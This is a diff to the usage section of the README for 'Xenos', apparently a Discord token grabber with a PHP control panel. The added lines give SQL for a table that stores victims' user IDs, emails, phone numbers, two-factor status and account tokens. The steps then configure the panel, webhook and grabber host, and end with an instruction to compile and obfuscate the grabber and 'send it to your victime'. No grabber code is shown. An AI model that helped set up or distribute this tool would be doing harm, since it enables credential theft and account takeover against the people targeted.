@@ -22,13 +22,27 @@
 > ## Usage
 > For use Xenos, you need a Server accept PHP and contain a database,
 > 1. Put the files in your host
-> 2. Make your database ip,databse name,username,password in the file `Inc/database.php`
-> 3. Setup your password in `Async/login.php` (its the password for access to the panel)
-> 4. Setup your password and your webhook in `api.php` at line 8 and 9.
-> 5. Make your host adress in `Grabber/python/Xenos.py` at line 5
-> 6. Compte and Obfusque your Grabber and send it to your victime :)
+> 2. Create database with `tokens` table, and this columns:
+> ```sql
+> CREATE TABLE `tokens` (
+>   `user_id` text NOT NULL,
+>   `username` text NOT NULL,
+>   `avatar` text NOT NULL,
+>   `email` text NOT NULL,
+>   `phone` text NOT NULL,
+>   `badges` text NOT NULL,
+>   `nitro_badges` text NOT NULL,
+>   `twofactor` text NOT NULL,
+>   `token` text NOT NULL
+> ) ENGINE=InnoDB DEFAULT CHARSET=utf8;
+> ```
+> 3. Make your database ip,databse name,username,password in the file `Inc/database.php`
+> 4. Setup your password in `Async/login.php` (its the password for access to the panel)
+> 5. Setup your password and your webhook in `api.php` at line 8 and 9.
+> 6. Make your host adress in `Grabber/python/Xenos.py` at line 5
+> 7. Compte and Obfusque your Grabber and send it to your victime :)
 
-> 7. Put a stars and follow me for more :)
+> 8. Put a stars and follow me for more :)
 
 <br><br>
 
